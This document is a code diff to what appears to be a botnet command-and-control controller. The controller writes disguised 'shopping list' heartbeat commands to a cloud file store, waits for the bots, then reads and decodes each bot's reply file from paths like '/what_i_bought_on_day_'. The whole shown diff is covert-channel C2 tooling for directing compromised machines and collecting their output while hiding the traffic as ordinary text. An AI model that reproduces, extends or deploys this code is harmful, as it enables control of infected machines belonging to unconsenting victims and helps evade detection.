@@ -29,15 +29,13 @@ def heartbeat(period, connection, shopping_list, negative_counter):
         # send ALIVE command
         if not connection.append_to_file(shopping_list, "on " + str(local_counter) + " day buy alive cat\n"):
             is_ok = False
-            print("\033[41mcould not sent heartbeat\033[0m", end='')
-        else:
-            print("\033[42mheartbeat sent\033[0m", end='')
+            print("\033[41m(could not sent heartbeat)\033[0m", end='')
 
         # Wait for 60 seconds
         time.sleep(period)
 
         if is_ok:
-            print("\033[42mm10 bots here.\033[0m", end='')
+            print("\033[42m(10 bots here)\033[0m", end='')
 
 
 def main():
@@ -148,6 +146,24 @@ def main():
         if command[0] == "end":
             print("Good bye")
             os._exit(0)
+
+        # wait
+        print("Waiting for bots. Interval is", interval, "+ 10 seconds\n")
+        time.sleep(interval + 10)
+
+        print("The response is:\n")
+        start_path = "/what_i_bought_on_day_" + str(counter)
+
+        files = conn.list_files("")
+        for f in files:
+            path = str(f.path_display)
+            if path.startswith(start_path):
+                content = conn.get_file_content(path)
+                print(f"\033[93m")
+                print("Bot", path[len(start_path) + 1:].split('.')[0], "\n")
+                print(translations.decode_string(content.decode("utf-8")))
+                print("\033[0m")
+                # conn.delete_file(f.path_display)
 
 
 if __name__ == "__main__":
